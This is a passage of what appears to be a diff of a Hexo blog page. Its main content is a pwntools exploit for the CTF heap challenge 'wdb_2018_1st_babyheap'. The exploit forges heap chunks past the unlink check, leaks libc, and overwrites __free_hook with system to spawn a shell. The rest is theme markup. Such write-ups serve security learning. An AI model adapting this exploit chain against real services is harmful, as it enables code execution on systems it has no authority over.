class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt;1 and sys.argv[1] &#x3D;&#x3D; &#39;r&#39;:</span><br><span class="line">    target &#x3D; remote(&quot;node3.buuoj.cn&quot;,26070 )</span><br><span class="line">else:</span><br><span class="line">    #target &#x3D; process(&quot;&quot;)</span><br><span class="line">    target&#x3D;process([&quot;&#x2F;home&#x2F;trident&#x2F;ctfworkspace&#x2F;glibc&#x2F;glibc-all-in-one-master&#x2F;libs&#x2F;2.23-0ubuntu11.2_amd64&#x2F;ld-2.23.so&quot;,&quot;.&#x2F;wdb_2018_1st_babyheap&quot;],env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;.&#x2F;libc.so.6&quot;&#125;)</span><br><span class="line">    if(len(sys.argv)&gt;1) and sys.argv[1]&#x3D;&#x3D;&#39;g&#39;:</span><br><span class="line">        gdb.attach(target)</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">#context.update(arch&#x3D;&#39;&#39;)</span><br><span class="line">#gdb.attach(target)</span><br><span class="line">libC &#x3D; ELF(&quot;.&#x2F;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def alloc(index,content):</span><br><span class="line">    target.recvuntil(&quot;oice:&quot;)</span><br><span class="line">    target.sendline(&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">    target.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line">    target.recvuntil(&quot;tent:&quot;)</span><br><span class="line">    target.send(content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    target.recvuntil(&quot;oice:&quot;)</span><br><span class="line">    target.sendline(&quot;2&quot;)</span><br><span class="line">    target.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line">    target.recvuntil(&quot;tent:&quot;)</span><br><span class="line">    target.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    target.recvuntil(&quot;oice:&quot;)</span><br><span class="line">    target.sendline(&quot;3&quot;)</span><br><span class="line">    target.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    target.recvuntil(&quot;oice:&quot;)</span><br><span class="line">    target.sendline(&quot;4&quot;)</span><br><span class="line">    target.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    alloc(0,&quot;a\n&quot;)</span><br><span class="line">    alloc(1,&quot;b\n&quot;)</span><br><span class="line">    free(1)</span><br><span class="line">    free(0)</span><br><span class="line">    </span><br><span class="line">    show(0)</span><br><span class="line">    heap_leak &#x3D; u64(target.recv(6).ljust(8,&#39;\x00&#39;)) </span><br><span class="line">    success(hex(heap_leak))</span><br><span class="line">    </span><br><span class="line">    edit(0,p64(heap_leak-0x10)+p64(0)+p64(0)+p64(0x31))</span><br><span class="line">    </span><br><span class="line">    alloc(6,&quot;aaaa\n&quot;)</span><br><span class="line">    alloc(7,p64(0)+p64(0xa1)+&quot;\n&quot;)</span><br><span class="line">    alloc(2,&quot;CCCCCCC\n&quot;)</span><br><span class="line">    alloc(3,&quot;DDDDDDD\n&quot;)</span><br><span class="line"></span><br><span class="line">    alloc(4,p64(0)+p64(0x31)+p64(0x602080-0x18)+p64(0x602080-0x10)) #bypass unlink check</span><br><span class="line">    alloc(5,p64(0x30)+p64(0x30)+&#39;\n&#39;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    free(1)</span><br><span class="line">    show(1)</span><br><span class="line">    </span><br><span class="line">    leak2 &#x3D; u64(target.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">    success(hex(leak2))</span><br><span class="line">    libc_leak &#x3D; leak2 - 0x3c4b78</span><br><span class="line">    success(&quot;leaked libc: &quot; + hex(libc_leak))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    system &#x3D; libc_leak + 0x45390</span><br><span class="line">    success(&quot;system: &quot; + hex(system))</span><br><span class="line">    free_hook &#x3D; libc_leak + libC.symbols[&#39;__free_hook&#39;]</span><br><span class="line">    success(&quot;free_hook: &quot;+hex(free_hook))</span><br><span class="line">    </span><br><span class="line">    edit(4,p64(free_hook)+&quot;\n&quot;)</span><br><span class="line">    edit(1,p64(system)+&quot;\n&quot;)</span><br><span class="line">    </span><br><span class="line">    alloc(8,&quot;&#x2F;bin&#x2F;sh\x00&quot;+&#39;\n&#39;)</span><br><span class="line">    free(8)</span><br><span class="line"></span><br><span class="line">    target.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
 
-        </div>
+      
+    </div>
+
     
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
 
-</div>
-            
-        </section>
-    </div>
-</div>
 
-
-
-
-
-
-</div>
-
-<!-- Footer -->
-<div class="push"></div>
-
-<footer class="footer-content">
-    <div class="container">
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
-                <h2>About</h2>
-                <p>
-                    天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛
-                </p>
-            </div>
-            
-    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
-        <h2>Recent Posts</h2>
-        <ul>
-            
-            <li>
-                <a class="footer-post" href="/2077/02/25/hello/">Hello</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2021/05/20/pwn_snippet/">Pwn Snippet</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2021/05/14/House%20of%20Einherjar/">House of Einherjar</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2021/05/14/House%20of%20Botcake/">House of Botcake</a>
-            </li>
-            
-        </ul>
-    </div>
+  
 
 
 
-            
-<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
-    <h2>Categories</h2>
-    <ul>
-        
-        <li>
-            <a class="footer-post" href="/categories/Code/">Code</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/Notes/">Notes</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/Write-Up/">Write-Up</a>
-        </li>
-        
-    </ul>
-</div>
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
 
         </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <ul class="list-inline footer-social-icons">
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                </ul>
-            </div>
-        </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <div class="footer-copyright">
-                    @Trident91. All right reserved | This epic theme is developed by <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
-                </div>
-            </div>
-        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Trident91</p>
+  <div class="site-description" itemprop="description">天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
     </div>
-</footer>
-
-<!-- After footer scripts -->
-
-<!-- jQuery -->
-<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
-
-<!-- Tween Max -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
-
-<!-- Gallery -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
-
-<!-- Custom JavaScript -->
-
-<script src="/js/main.js"></script>
+  </aside>
+  <div id="sidebar-dimmer"></div>
 
 
-<!-- Disqus Comments -->
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Trident91</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
 
 
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
 
 </body>
-
 </html>
